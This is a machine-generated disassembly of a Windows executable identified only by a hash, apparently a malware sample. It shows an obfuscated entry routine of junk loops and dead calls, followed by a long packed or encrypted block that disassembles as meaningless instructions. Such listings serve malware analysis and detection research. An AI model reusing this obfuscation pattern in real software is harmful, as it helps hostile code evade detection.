
e50060bb20642d7a7b92448f98b0ff394918454a99afdbb01e6a3e0cd7755159.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e89,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e89,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9d,0x10
  401025:	cmp    DWORD PTR ds:0x428e9d,0x0
  40102c:	je     0x401092
  401032:	cmp    DWORD PTR ds:0x428e9d,0x3
  401039:	jle    0x401092
  40103f:	jmp    0x401066
  401044:	push   0x559d
  401049:	push   0x2a1f
  40104e:	push   0x41ed
  401053:	push   DWORD PTR [ebp-0x1c]
  401056:	push   0x428124
  40105b:	push   0x44ac
  401060:	call   DWORD PTR ds:0x42ca10
  401066:	cmp    DWORD PTR ds:0x428e9d,0x4
  40106d:	jne    0x401080
  401073:	mov    edi,DWORD PTR ds:0x428e9d
  401079:	dec    edi
  40107a:	mov    DWORD PTR ds:0x428e9d,edi
  401080:	mov    edi,DWORD PTR ds:0x428e9d
  401086:	dec    edi
  401087:	mov    DWORD PTR ds:0x428e9d,edi
  40108d:	jmp    0x401025
  401092:	mov    esi,0x75108b1
  401097:	mov    DWORD PTR ds:0x428e91,0x16
  4010a1:	cmp    DWORD PTR ds:0x428e91,0x0
  4010a8:	je     0x4010ef
  4010ae:	cmp    DWORD PTR ds:0x428e91,0x25
  4010b5:	jge    0x4010ef
  4010bb:	jmp    0x4010dd
  4010c0:	push   DWORD PTR [ebp-0x20]
  4010c3:	push   0x1b69
  4010c8:	push   0x4c28
  4010cd:	push   0x78bb
  4010d2:	push   0x428ec1
  4010d7:	call   DWORD PTR ds:0x42ca14
  4010dd:	mov    ecx,DWORD PTR ds:0x428e91
  4010e3:	dec    ecx
  4010e4:	mov    DWORD PTR ds:0x428e91,ecx
  4010ea:	jmp    0x4010a1
  4010ef:	xor    eax,esi
  4010f1:	or     ecx,DWORD PTR ds:0x428e95
  4010f7:	mov    edi,0x3272f8
  4010fc:	add    eax,edi
  4010fe:	xor    ecx,DWORD PTR ds:0x428e61
  401104:	mov    DWORD PTR [ebp-0x40],eax
  401107:	mov    ecx,DWORD PTR ds:0x428ef5
  40110d:	mov    eax,ds:0x42a075
  401112:	sub    eax,ecx
  401114:	sub    ecx,DWORD PTR [ecx+eax*1]
  401117:	mov    eax,ds:0x4281e5
  40111c:	or     ecx,0x6919
  401122:	mov    eax,DWORD PTR [eax]
  401124:	mov    DWORD PTR [ebp-0x3c],eax
  401127:	mov    eax,ds:0x4283f5
  40112c:	xor    ecx,0x14c1
  401132:	mov    eax,DWORD PTR [eax]
  401134:	mov    DWORD PTR [ebp-0x1c],eax
  401137:	and    DWORD PTR ds:0x428e75,0x31f0
  401141:	mov    DWORD PTR [ebp-0x34],0xf89c87b9
  401148:	or     ecx,ecx
  40114a:	mov    eax,DWORD PTR [ebp-0x34]
  40114d:	xor    eax,esi
  40114f:	add    eax,edi
  401151:	mov    DWORD PTR [ebp-0x40],eax
  401154:	and    DWORD PTR ds:0x428eb9,0x0
  40115e:	jmp    0x401170
  401163:	mov    ecx,DWORD PTR ds:0x428eb9
  401169:	inc    ecx
  40116a:	mov    DWORD PTR ds:0x428eb9,ecx
  401170:	cmp    DWORD PTR ds:0x428eb9,0x1c
  401177:	jae    0x4011a0
  40117d:	cmp    DWORD PTR ds:0x428eb9,0x21
  401184:	jl     0x4011a0
  40118a:	jmp    0x40119b
  40118f:	push   DWORD PTR [ebp-0xc]
  401192:	push   DWORD PTR [ebp-0x18]
  401195:	call   DWORD PTR ds:0x42ca18
  40119b:	jmp    0x401163
  4011a0:	mov    eax,ds:0x428365
  4011a5:	or     DWORD PTR ds:0x428eb1,0x3218
  4011af:	mov    DWORD PTR [ebp-0x40],eax
  4011b2:	mov    DWORD PTR ds:0x428e69,0x16
  4011bc:	cmp    DWORD PTR ds:0x428e69,0x0
  4011c3:	je     0x401218
  4011c9:	cmp    DWORD PTR ds:0x428e69,0xb
  4011d0:	jg     0x401218
  4011d6:	jmp    0x4011ec
  4011db:	push   0x42804e
  4011e0:	push   DWORD PTR [ebp-0x24]
  4011e3:	push   DWORD PTR [ebp-0x24]
  4011e6:	call   DWORD PTR ds:0x42ca4c
  4011ec:	cmp    DWORD PTR ds:0x428e69,0xc
  4011f3:	jne    0x401206
  4011f9:	mov    ecx,DWORD PTR ds:0x428e69
  4011ff:	dec    ecx
  401200:	mov    DWORD PTR ds:0x428e69,ecx
  401206:	mov    ecx,DWORD PTR ds:0x428e69
  40120c:	dec    ecx
  40120d:	mov    DWORD PTR ds:0x428e69,ecx
  401213:	jmp    0x4011bc
  401218:	mov    eax,DWORD PTR [ebp-0x3c]
  40121b:	sbb    DWORD PTR ds:0x428ea5,0x6db4
  401225:	mov    DWORD PTR [ebp-0x14],eax
  401228:	mov    eax,DWORD PTR [ebp-0x14]
  40122b:	movzx  ecx,BYTE PTR ds:0x428e45
  401232:	xor    ecx,DWORD PTR ds:0x428e79
  401238:	mov    DWORD PTR ds:0x428e45,ecx
  40123e:	jmp    0x403595
  401243:	lods   eax,DWORD PTR ds:[esi]
  401244:	ins    DWORD PTR es:[edi],dx
  401245:	call   0x9776:0xb1685a84
  40124c:	xchg   ebx,eax
  40124d:	add    bh,cl
  40124f:	mov    ebp,0x7bef1fa1
  401254:	jnp    0x4012d1
  401256:	jnp    0x40120d
  401258:	sahf   
  401259:	jnp    0x4012d6
  40125b:	aam    0xcd
  40125d:	(bad)  
  40125e:	rcr    al,0xc4
  401261:	fcmove st,st(6)
  401263:	test   cl,al
  401265:	mov    BYTE PTR [edi-0x7473722a],al
  40126b:	mov    WORD PTR [ebx-0x6effe2dc],?
  401271:	test   eax,0x519a808a
  401276:	or     DWORD PTR [eax+ebx*4-0x3e5463d2],0x7766fb6d
  401281:	xchg   esi,eax
  401282:	lods   al,BYTE PTR ds:[esi]
  401283:	jle    0x40123b
  401285:	jno    0x4012ce
  401287:	jle    0x4012ca
  401289:	inc    ebx
  40128a:	mov    edx,0x1d87fecd
  40128f:	sti    
  401290:	xchg   edx,eax
  401291:	jle    0x401272
  401293:	or     al,0xb8
  401295:	sub    al,0x3b
  401297:	or     al,0x66
  401299:	rcr    BYTE PTR [edi],cl
  40129b:	push   0xffffffc8
  40129d:	out    dx,al
  40129e:	cwde   
  40129f:	dec    edx
  4012a0:	imul   esp,DWORD PTR ds:0xe51c8cf6,0x15
  4012a7:	out    dx,eax
  4012a8:	sti    
  4012a9:	(bad)  
  4012aa:	fldcw  WORD PTR [ecx-0x76753813]
  4012b0:	cmp    BYTE PTR [esi-0x2e],cl
  4012b3:	mov    al,ds:0x8fe47e4
  4012b8:	test   al,0xca
  4012ba:	jne    0x40126f
  4012bc:	sub    DWORD PTR [edx+0x79fbdbf8],ebx
  4012c2:	inc    eax
  4012c3:	sbb    BYTE PTR [ecx+ebx*2],0x9e
  4012c7:	push   0x40
  4012c9:	out    0xd5,al
  4012cb:	arpl   WORD PTR [eax+0x73bd5ff2],si
  4012d1:	jb     0x4012bd
  4012d3:	sbb    ecx,esp
  4012d5:	xchg   ebx,eax
  4012d6:	ins    BYTE PTR es:[edi],dx
  4012d7:	mov    ch,0xb2
  4012d9:	xchg   ebp,eax
  4012da:	add    ch,BYTE PTR [esi]
  4012dc:	imul   ecx,eax,0x68
  4012df:	xor    DWORD PTR [esi],esi
  4012e1:	sub    eax,0xa4059069
  4012e6:	xchg   ebx,eax
  4012e7:	lods   eax,DWORD PTR ds:[esi]
  4012e8:	in     eax,dx
  4012e9:	mov    edi,0x4ce2b7f2
  4012ee:	stos   BYTE PTR es:[edi],al
  4012ef:	sub    eax,DWORD PTR [esi-0x4f]
  4012f2:	and    ebp,esp
  4012f4:	xchg   edi,eax
  4012f5:	cld    
  4012f6:	xchg   ebx,eax
  4012f7:	xchg   edi,eax
  4012f8:	inc    esp
  4012f9:	clc    
  4012fa:	mov    DWORD PTR [esi],edi
  4012fc:	stc    
  4012fd:	mov    ds:0xce6706e4,eax
  401302:	push   ecx
  401303:	data16 loope 0x401317
  401306:	test   eax,0x5dcf7e5d
  40130b:	imul   esi,ebx,0x53
  40130e:	cmp    al,0x54
  401310:	cmp    DWORD PTR [ebp+0x1c],0x7417bcc1
  401317:	pop    eax
  401318:	push   0x4cec391b
  40131d:	and    al,0xe1
  40131f:	xchg   esi,eax
  401320:	xor    edx,esi
  401322:	inc    esi
  401323:	in     eax,0x3b
  401325:	lds    ebp,FWORD PTR [esi+0x4539e327]
  40132b:	out    0x89,al
  40132d:	or     al,0x4d
  40132f:	cdq    
  401330:	(bad)  
  401331:	popf   
  401332:	test   al,0xfd
  401334:	pop    ecx
  401335:	cs data16 (bad) 
  401338:	jecxz  0x401378
  40133a:	pop    ecx
  40133b:	cld    
  40133c:	sar    BYTE PTR [ecx+0x74],0xc9
  401340:	ja     0x4013b5
  401342:	mov    BYTE PTR [ebx-0x53a3f6cc],ch
  401348:	bound  ebx,QWORD PTR [ebp-0x62a9d389]
  40134e:	push   es
  40134f:	jle    0x40139a
  401351:	cld    
  401352:	sti    
  401353:	std    
  401354:	repz add DWORD PTR [eax-0x508f183e],0xaa5f8130
  40135f:	ror    BYTE PTR [ebx+0x77],1
  401362:	dec    ebx
  401363:	leave  
  401364:	imul   esi,DWORD PTR ds:0x73f679e3,0xffffffa9
  40136b:	mov    bl,0x6d
  40136d:	mov    WORD PTR [ebx-0xd],cs
  401370:	iret   
  401371:	ret    
  401372:	enter  0xf560,0x89
  401376:	xor    BYTE PTR [esi-0x1731e11e],al
  40137c:	retf   
  40137d:	fadd   DWORD PTR [edi]
  40137f:	xchg   edx,eax
  401380:	mov    esp,0xa1f4fa5b
  401385:	add    eax,0xce9ff933
  40138a:	cmc    
  40138b:	adc    BYTE PTR [edx],cl
  40138d:	arpl   WORD PTR [ecx-0x6d],sp
  401390:	or     edx,0x59
  401393:	std    
  401394:	inc    eax
  401395:	jmp    0x43f6:0x7c833c1e
  40139c:	fstp   QWORD PTR ds:0x4403d60f
  4013a2:	add    al,0xe0
  4013a4:	adc    edx,esp
  4013a6:	icebp  
  4013a7:	push   ebx
  4013a8:	dec    esp
  4013a9:	jno    0x401340
  4013ab:	js     0x4013fb
  4013ad:	cs and al,0x2e
  4013b0:	repnz (bad) 
  4013b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013b3:	ror    edx,1
  4013b5:	sbb    BYTE PTR [eax-0x3834fc54],bl
  4013bb:	into   
  4013bc:	push   edx
  4013bd:	stos   DWORD PTR es:[edi],eax
  4013be:	jmp    0x2d26:0x56557bf8
  4013c5:	jmp    0x4013a8
  4013c7:	addr16 push esi
  4013c9:	mov    esi,0xb9ba21f2
  4013ce:	or     eax,0x96f9fe50
  4013d3:	and    eax,0xf2f4ef2f
  4013d8:	cmp    edi,edx
  4013da:	push   es
  4013db:	outs   dx,BYTE PTR ds:[esi]
  4013dc:	mov    ds:0x829fc5d9,eax
  4013e1:	jne    0x401400
  4013e3:	and    BYTE PTR [ebp-0x2b6e68b7],cl
  4013e9:	div    DWORD PTR [edx+0x13]
  4013ec:	loop   0x40145c
  4013ee:	(bad)  [edi+0x6e]
  4013f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013f2:	ds aas 
  4013f4:	xchg   esp,eax
  4013f5:	adc    al,BYTE PTR [esi+0x12]
  4013f8:	sbb    BYTE PTR [ebx+0x3de1bcf6],ah
  4013fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013ff:	(bad)  
  401400:	lock pop ebx
  401402:	sub    DWORD PTR [edx],0xfffffff9
  401405:	or     ebp,DWORD PTR [eax]
  401407:	out    0x68,al
  401409:	inc    edx
  40140a:	pop    es
  40140b:	ins    DWORD PTR es:[edi],dx
  40140c:	cmp    BYTE PTR [ebx-0x5f531647],ch
  401412:	loopne 0x4013f9
  401414:	add    DWORD PTR [ecx+0x31],edi
  401417:	pop    es
  401418:	loopne 0x4013dc
  40141a:	aas    
  40141b:	in     al,0x5
  40141d:	cmp    eax,0x5350c241
  401422:	cmp    al,0x23
  401424:	stc    
  401425:	mov    esi,0xa224b74d
  40142a:	dec    ebp
  40142b:	shl    DWORD PTR [ecx+esi*4-0x5b],cl
  40142f:	pop    edx
  401430:	shr    BYTE PTR ds:0x9fb06d6a,1
  401436:	cmp    BYTE PTR [edx+esi*8+0x24610036],dl
  40143d:	test   BYTE PTR ds:0xaefd8545,cl
  401443:	je     0x401435
  401445:	adc    esp,DWORD PTR [ecx+0x1c]
  401448:	ss xor eax,0x5ae64ed2
  40144e:	push   edx
  40144f:	push   es
  401450:	and    edx,DWORD PTR [ebx+0x62]
  401453:	xchg   ecx,eax
  401454:	fwait
  401455:	or     eax,0x7c37d4dd
  40145a:	enter  0xb17c,0xa8
  40145e:	xchg   esi,eax
  40145f:	mov    cl,0x8c
  401461:	je     0x401492
  401463:	push   ss
  401464:	dec    ecx
  401465:	adc    al,0xd8
  401467:	mov    ds:0x6ff7e8ca,al
  40146c:	and    cl,BYTE PTR [ebp-0x5b]
  40146f:	out    dx,al
  401470:	call   0xec19:0x9a8fe160
  401477:	pushf  
  401478:	sub    DWORD PTR [eax-0x5f22fe68],edi
  40147e:	stos   DWORD PTR es:[edi],eax
  40147f:	lds    ecx,FWORD PTR [esi-0x79]
  401482:	bound  ebp,QWORD PTR [esi]
  401484:	pop    edi
  401485:	lods   eax,DWORD PTR ds:[esi]
  401486:	and    dl,BYTE PTR [esp+ebx*1-0x4f]
  40148a:	lods   al,BYTE PTR ds:[esi]
  40148b:	pop    esi
  40148c:	mov    DWORD PTR [edx],ecx
  40148e:	jge    0x40148c
  401490:	or     dl,BYTE PTR [ebx-0x3]
  401493:	xor    BYTE PTR [eax+edx*4-0x61],dl
  401497:	cmp    eax,edx
  401499:	loop   0x40150a
  40149b:	mov    cl,BYTE PTR [edi+edx*2]
  40149e:	sar    ebx,1
  4014a0:	or     ebp,DWORD PTR [ebp+0x529d3a4b]
  4014a6:	sub    bh,BYTE PTR [ecx-0x7d]
  4014a9:	or     BYTE PTR [ebx],ah
  4014ab:	xor    al,0xbc
  4014ad:	and    ah,BYTE PTR [ebp-0x75dc31de]
  4014b3:	push   edi
  4014b4:	retf   
  4014b5:	mov    ebx,0x627582b6
  4014ba:	jno    0x401500
  4014bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014bd:	cmp    eax,DWORD PTR [edx-0x63]
  4014c0:	(bad)  
  4014c1:	mov    BYTE PTR [edi],dl
  4014c3:	es and eax,0xed9f3cb3
  4014c9:	add    cl,0x0
  4014cc:	std    
  4014cd:	mov    ecx,0x6e99a30d
  4014d2:	out    dx,al
  4014d3:	or     al,0x89
  4014d5:	push   ecx
  4014d6:	dec    ecx
  4014d7:	add    edx,DWORD PTR [esp+eax*4+0x72633b09]
  4014de:	in     al,dx
  4014df:	push   edx
  4014e0:	jmp    FWORD PTR [eax-0x28]
  4014e3:	aaa    
  4014e4:	test   eax,0x8060fa1b
  4014e9:	test   al,0xd4
  4014eb:	and    dl,0xae
  4014ee:	sbb    al,0x52
  4014f0:	or     eax,0x2e4fea28
  4014f5:	xor    DWORD PTR [edi-0x15],eax
  4014f8:	sbb    bh,dl
  4014fa:	fdiv   DWORD PTR [ebx]
  4014fc:	and    BYTE PTR [ebx-0x57b08480],bl
  401502:	mov    ecx,0x8500be91
  401507:	cs scas al,BYTE PTR es:[edi]
  401509:	mov    al,ds:0xd1b25e7f
  40150e:	xlat   BYTE PTR ds:[ebx]
  40150f:	xor    BYTE PTR [ecx],cl
  401511:	test   al,0x35
  401513:	mov    bh,0x14
  401515:	mov    eax,ds:0xc8d24931
  40151a:	sti    
  40151b:	jecxz  0x401548
  40151d:	mov    ebx,0x84441b51
  401522:	adc    ebx,DWORD PTR [ecx+0x158408f4]
  401528:	and    al,0xc6
  40152a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40152b:	mov    ds:0x4cbe6b29,eax
  401530:	sbb    al,0x7a
  401532:	jg     0x401546
  401534:	add    ah,ch
  401536:	pop    ebx
  401537:	test   DWORD PTR [ebp+0x24],ecx
  40153a:	repnz pop eax
  40153c:	(bad)  
  40153d:	mov    edx,eax
  40153f:	cld    
  401540:	pop    edi
  401541:	push   0xe6442d98
  401546:	rol    BYTE PTR [edi+ecx*1],1
  401549:	stc    
  40154a:	lea    esp,[ebx]
  40154c:	cli    
  40154d:	out    dx,eax
  40154e:	(bad)  
  40154f:	repnz cmp al,0xf6
  401552:	sahf   
  401553:	jbe    0x401500
  401555:	out    0x29,al
  401557:	cmc    
  401558:	mov    BYTE PTR [esi-0x25fe224b],bh
  40155e:	xchg   DWORD PTR [esi-0x263885dc],esp
  401564:	(bad)  
  401565:	test   al,0x33
  401567:	push   ebx
  401568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401569:	retf   
  40156a:	adc    dh,BYTE PTR [bp+si]
  40156d:	imul   ecx,DWORD PTR [ebp-0x6dab62c5],0xb
  401574:	retf   0xa63b
  401577:	js     0x4015ed
  401579:	int    0x19
  40157b:	idiv   BYTE PTR [ecx+0x3c44ceee]
  401581:	ficomp DWORD PTR [eax+ecx*2-0x3d]
  401585:	inc    esp
  401586:	add    DWORD PTR [ecx+0x7b4ec13a],ebx
  40158c:	dec    eax
  40158d:	stos   BYTE PTR es:[edi],al
  40158e:	retf   
  40158f:	test   eax,0xa74bae27
  401594:	out    dx,al
  401595:	ja     0x40155e
  401597:	push   ebp
  401598:	retf   0xd2d0
  40159b:	xchg   ebp,eax
  40159c:	adc    ah,0x18
  40159f:	adc    eax,0x368740a4
  4015a4:	mov    al,0x2d
  4015a6:	mov    ecx,0xb8dd64e3
  4015ab:	jl     0x401609
  4015ad:	dec    ebx
  4015ae:	mov    cl,0x9f
  4015b0:	gs lock pop edi
  4015b3:	mov    DWORD PTR ds:0x2540ce4e,edi
  4015b9:	jno    0x40156a
  4015bb:	inc    ebx
  4015bc:	sbb    al,0xf4
  4015be:	mov    ds:0x1330ad7b,eax
  4015c3:	scas   al,BYTE PTR es:[edi]
  4015c4:	jo     0x40154b
  4015c6:	test   al,0x52
  4015c8:	mov    cl,0xbd
  4015ca:	pop    ss
  4015cb:	or     eax,0x8fbd470
  4015d0:	clc    
  4015d1:	rcl    DWORD PTR [edi-0x36680713],1
  4015d7:	icebp  
  4015d8:	lods   eax,DWORD PTR ds:[esi]
  4015d9:	out    0xec,al
  4015db:	icebp  
  4015dc:	repz cmp esp,DWORD PTR [edi]
  4015df:	lahf   
  4015e0:	shr    BYTE PTR [edi+edi*2+0x5d],cl
  4015e4:	push   0x32
  4015e6:	xchg   cl,dh
  4015e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e9:	mov    edi,0xb5906703
  4015ef:	push   eax
  4015f0:	cmp    BYTE PTR [edi+eax*2-0x14],dl
  4015f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015f5:	icebp  
  4015f6:	sbb    al,bl
  4015f8:	clc    
  4015f9:	add    BYTE PTR [ecx+ecx*4-0xb],dl
  4015fd:	stos   BYTE PTR es:[edi],al
  4015fe:	sub    bl,BYTE PTR [ebp+0x5f]
  401601:	lods   al,BYTE PTR ds:[esi]
  401602:	stos   DWORD PTR es:[edi],eax
  401603:	sub    DWORD PTR [ebp-0x191992c9],edx
  401609:	adc    DWORD PTR ds:0x5e4048b8,ebp
  40160f:	frstor [eax+0x41d9c820]
  401615:	or     BYTE PTR [ebx+eax*2+0xfbb13f1],al
  40161c:	scas   eax,DWORD PTR es:[edi]
  40161d:	call   0x424a8b00
  401622:	fs push esi
  401624:	or     BYTE PTR [ebp+0x3f3e455b],bl
  40162a:	popf   
  40162b:	mov    ebp,esp
  40162d:	fdiv   QWORD PTR [ecx]
  40162f:	scas   al,BYTE PTR es:[edi]
  401630:	pop    edx
  401631:	cmp    eax,0xb5314fe9
  401636:	mov    al,ds:0xfae777de
  40163b:	cmp    eax,DWORD PTR [ebp-0x5a811c81]
  401641:	dec    esi
  401642:	(bad)  
  401643:	sub    BYTE PTR [esi+0x3dcfc7c7],ah
  401649:	add    ebx,DWORD PTR [esi+0x5d584bd8]
  40164f:	sub    eax,0xaacbb1eb
  401654:	dec    eax
  401655:	jns    0x4015f8
  401657:	adc    dl,bh
  401659:	mov    esi,0xb6d1e29e
  40165e:	xor    BYTE PTR [ecx+ecx*1-0x1ef5a2af],al
  401665:	push   es
  401666:	mov    ds,ecx
  401668:	outs   dx,DWORD PTR ds:[esi]
  401669:	les    ebp,FWORD PTR [ebx-0x22]
  40166c:	fs stos DWORD PTR es:[edi],eax
  40166e:	xor    bh,BYTE PTR [edx+0x617e6f97]
  401674:	mov    dl,0x25
  401676:	or     BYTE PTR [eax+0x45ad4e3c],bh
  40167c:	push   ds
  40167d:	(bad)  
  40167e:	or     BYTE PTR [ecx],cl
  401680:	rcl    bl,1
  401682:	rcr    DWORD PTR [ebx],0xf0
  401685:	dec    esi
  401686:	xor    eax,0xc21c4393
  40168b:	pop    edi
  40168c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40168d:	jmp    0xcf9e07ce
  401692:	dec    eax
  401693:	test   DWORD PTR [edi+ebx*4],edi
  401696:	pushf  
  401697:	jae    0x4016d7
  401699:	inc    ebx
  40169a:	inc    ebx
  40169b:	push   ebp
  40169c:	loopne 0x401683
  40169e:	out    dx,eax
  40169f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016a0:	(bad)  
  4016a1:	retf   0x4339
  4016a4:	lods   eax,DWORD PTR ds:[esi]
  4016a5:	bound  ecx,QWORD PTR [ebx]
  4016a7:	inc    edi
  4016a8:	daa    
  4016a9:	int    0x17
  4016ab:	ret    
  4016ac:	sbb    ah,BYTE PTR [ebx-0x41cb100b]
  4016b2:	pop    ecx
  4016b3:	and    BYTE PTR ds:0xa6d737b5,cl
  4016b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016ba:	sub    bh,cl
  4016bc:	aam    0xcd
  4016be:	call   0x7d7f:0x2819af00
  4016c5:	int3   
  4016c6:	cs in  al,0x6d
  4016c9:	loopne 0x40171c
  4016cb:	cmp    ebx,DWORD PTR [ebp+eax*4+0x39020a2d]
  4016d2:	mov    ds:0xa2f0ef64,al
  4016d7:	sbb    ch,BYTE PTR [ebx+edi*1]
  4016da:	sub    BYTE PTR [edx-0x6f5e63c9],cl
  4016e0:	jae    0x401734
  4016e2:	imul   esp,DWORD PTR [esi+0x18],0xb36e4b50
  4016e9:	out    0xb0,al
  4016eb:	mov    bl,0x6e
  4016ed:	mov    dl,0x64
  4016ef:	fldcw  WORD PTR [ecx+0x53def44a]
  4016f5:	pop    ebx
  4016f6:	dec    ebp
  4016f7:	mov    ebp,0xc590c18f
  4016fc:	rcr    BYTE PTR [ebx+0x172ad7eb],1
  401702:	int3   
  401703:	pop    edx
  401704:	adc    BYTE PTR [ebp+0x62],dl
  401707:	ror    BYTE PTR [ecx-0x46],cl
  40170a:	xor    cl,BYTE PTR [esi]
  40170c:	xchg   DWORD PTR [bp+si],esp
  40170f:	bound  ecx,QWORD PTR [edx-0x1b]
  401712:	sar    DWORD PTR [ecx+0x28f61107],cl
  401718:	inc    edx
  401719:	repnz push esi
  40171b:	icebp  
  40171c:	es inc edx
  40171e:	push   edx
  40171f:	imul   esp,ebx,0x4cba0087
  401725:	adc    eax,0x623be9c3
  40172a:	xchg   esi,eax
  40172b:	pop    es
  40172c:	inc    edx
  40172d:	sub    al,0x6b
  40172f:	lods   eax,DWORD PTR ds:[esi]
  401730:	lods   eax,DWORD PTR ds:[esi]
  401731:	dec    esi
  401732:	xor    bh,0x58
  401735:	cmp    eax,0x786540
  40173a:	or     bh,BYTE PTR [edi]
  40173c:	xlat   BYTE PTR ds:[ebx]
  40173d:	pushf  
  40173e:	mov    edx,0x413ba9c8
  401743:	mov    bl,0x8f
  401745:	add    al,0xcc
  401747:	xchg   DWORD PTR [edx],ebp
  401749:	cdq    
  40174a:	cs jo  0x401726
  40174d:	in     eax,0x72
  40174f:	cmp    eax,0xd716b954
  401754:	adc    ah,BYTE PTR [ecx-0x6b1ea59c]
  40175a:	jp     0x401791
  40175c:	das    
  40175d:	(bad)  
  40175e:	fild   WORD PTR [ecx+ebx*1-0x45c34242]
  401765:	js     0x4017d5
  401767:	imul   ecx,DWORD PTR [esp+edx*8],0x42e6ac3f
  40176e:	xchg   edi,eax
  40176f:	mov    ds:0x60538dc3,al
  401774:	daa    
  401775:	ret    0x514e
  401778:	lea    edx,[edi-0x19]
  40177b:	or     ch,BYTE PTR [eax+0x30]
  40177e:	mov    bl,0x8d
  401780:	dec    edi
  401781:	lahf   
  401782:	cmp    ebp,DWORD PTR [edx]
  401784:	and    DWORD PTR [ecx-0x7a],edi
  401787:	clc    
  401788:	xor    ebx,DWORD PTR [esi-0x7e95709f]
  40178e:	or     ecx,DWORD PTR [edi-0x71b80d8]
  401794:	lods   al,BYTE PTR ds:[esi]
  401795:	lea    eax,[edx+0x7595e1bc]
  40179b:	and    bl,bl
  40179d:	jns    0x4017b3
  40179f:	cmp    ebp,ebp
  4017a1:	xchg   ebp,eax
  4017a2:	xor    DWORD PTR [ebx+0x61aa67f],0x6a
  4017a9:	in     al,dx
  4017aa:	js     0x401813
  4017ac:	jmp    0x40175b
  4017ae:	sti    
  4017af:	es inc edx
  4017b1:	sub    al,0x27
  4017b3:	mov    cl,dh
  4017b5:	push   DWORD PTR [esi]
  4017b7:	in     eax,dx
  4017b8:	adc    BYTE PTR [ecx+0x2b],ch
  4017bb:	push   edx
  4017bc:	sub    edx,DWORD PTR [eax]
  4017be:	add    DWORD PTR [edi+0x65],ebp
  4017c1:	lds    ecx,FWORD PTR [ebx+edx*4]
  4017c4:	mov    ch,0x10
  4017c6:	sub    esp,DWORD PTR [eax+esi*1+0x3f]
  4017ca:	lods   al,BYTE PTR ds:[esi]
  4017cb:	dec    edi
  4017cc:	mov    bh,0x4a
  4017ce:	stos   DWORD PTR es:[edi],eax
  4017cf:	jb     0x40176b
  4017d1:	xor    al,0xb5
  4017d3:	inc    esi
  4017d4:	xor    eax,edx
  4017d6:	jns    0x401835
  4017d8:	cmc    
  4017d9:	addr16 out dx,eax
  4017db:	mov    al,ds:0x1b060244
  4017e0:	(bad)  
  4017e1:	jbe    0x4017bf
  4017e3:	adc    al,0x4d
  4017e5:	pop    esi
  4017e6:	test   eax,0xed7bf98
  4017eb:	loope  0x401830
  4017ed:	iret   
  4017ee:	mov    dl,0xf9
  4017f0:	mov    al,ds:0xb0e6ab9e
  4017f5:	mov    eax,ds:0xee3cc6c0
  4017fa:	sub    BYTE PTR [ecx],ch
  4017fc:	pop    ecx
  4017fd:	cmp    al,0x89
  4017ff:	ret    0xd422
  401802:	mov    bl,0x78
  401804:	inc    ebp
  401805:	out    0xf7,al
  401807:	sub    DWORD PTR [eax],edi
  401809:	stos   DWORD PTR es:[di],eax
  40180b:	inc    ebx
  40180c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40180d:	fsubr  QWORD PTR [ebx-0x10]
  401810:	adc    eax,0xca4f7c3f
  401815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401816:	test   DWORD PTR [edi],edi
  401818:	mov    edx,DWORD PTR [edi+eiz*8+0x6727c5f0]
  40181f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401820:	test   BYTE PTR [ebx+ebx*8-0x3f],ch
  401824:	and    ecx,esp
  401826:	out    dx,al
  401827:	loopne 0x40186f
  401829:	icebp  
  40182a:	sbb    eax,0x2fd62352
  40182f:	lds    edi,FWORD PTR [ebx]
  401831:	fsub   QWORD PTR [ecx]
  401833:	jge    0x4017b5
  401835:	retf   0x4f57
  401838:	pushf  
  401839:	(bad)  
  40183a:	sbb    BYTE PTR [ecx+0x53f9bac6],dl
  401840:	push   sp
  401842:	hlt    
  401843:	mov    eax,0xcd77917c
  401848:	pop    ebx
  401849:	(bad)  
  40184a:	(bad)  
  40184b:	dec    BYTE PTR [ebx-0x4e85fe2c]
  401851:	mov    eax,ds:0x60b7783b
  401856:	mov    ah,0x3a
  401858:	fsub   DWORD PTR [ebp+0x65]
  40185b:	inc    ecx
  40185c:	fisub  WORD PTR [ecx+eax*8-0x8b2de9a]
  401863:	jl     0x401809
  401865:	loope  0x4018e2
  401867:	mov    bl,0xb5
  401869:	lahf   
  40186a:	cwde   
  40186b:	retf   
  40186c:	int3   
  40186d:	sub    BYTE PTR [edx+edi*2-0x3b],bh
  401871:	push   edx
  401872:	xor    eax,ecx
  401874:	repz js 0x401826
  401877:	adc    eax,0x22c42b87
  40187c:	(bad)  
  40187d:	loopne 0x40181e
  40187f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401880:	jg     0x4018df
  401882:	add    DWORD PTR [ebp-0x1d],ebx
  401885:	pop    esi
  401886:	sbb    eax,0xd44983c6
  40188b:	(bad)
  40188e:	js     0x4018db
  401890:	jbe    0x4018b0
  401892:	xor    bl,cl
  401894:	aas    
  401895:	pop    ss
  401896:	sbb    dl,bh
  401898:	idiv   BYTE PTR [esi-0x57]
  40189b:	lahf   
  40189c:	lods   al,BYTE PTR ds:[esi]
  40189d:	sub    DWORD PTR [eax+0x7bfcdf4c],edi
  4018a3:	push   ds
  4018a4:	nop
  4018a5:	pop    ebx
  4018a6:	pop    eax
  4018a7:	repz test eax,0xddf1a5b1
  4018ad:	mov    bl,0x3f
